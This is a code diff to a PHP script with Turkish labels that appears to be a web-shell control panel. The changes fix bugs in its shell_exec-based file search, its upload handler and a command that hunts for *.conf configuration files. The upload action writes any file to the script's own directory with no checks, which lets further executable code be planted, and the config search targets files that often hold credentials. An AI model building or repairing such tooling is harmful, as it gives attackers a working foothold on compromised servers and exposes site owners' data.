@@ -157,7 +157,12 @@
                     if (isset($_POST['search-file-name'])) {
                         $searchFileName = $_POST['search-file-name'];
                         $output = shell_exec("ls | grep " . escapeshellarg($searchFileName));
-                        $outputArray = explode("\n", trim($output));
+
+                        if (!is_null($output)) {
+                            $outputArray = explode("\n", trim($output));
+                        } else {
+                            $outputArray = [];
+                        }
 
                         if (count($outputArray) > 0) {
                             echo "<table><thead><tr><td>Bulunan Dosyalar</td></tr></thead><tbody>";
@@ -177,7 +182,7 @@
                     break;
                 case 'file-upload':
                     if (isset($_FILES['upload-file'])) {
-                        $target_dir = "./"; 
+                        $target_dir = "./";
                         $target_file = $target_dir . basename($_FILES["upload-file"]["name"]);
 
                         if (move_uploaded_file($_FILES["upload-file"]["tmp_name"], $target_file)) {
@@ -193,7 +198,7 @@
                               </form>';
                     break;
                 case 'find-config-files':
-                    $output = shell_exec('find . -type f \( -name "*.conf")');
+                    $output = shell_exec('find . -type f -name "*.conf"');
 
                     if (!is_null($output)) {
                         $outputArray = explode("\n", trim($output));
@@ -210,6 +215,7 @@
                     } else {
                         echo "Hiçbir konfigürasyon dosyası bulunamadı.";
                     }
+                    break;
 
                     break;
                 default:
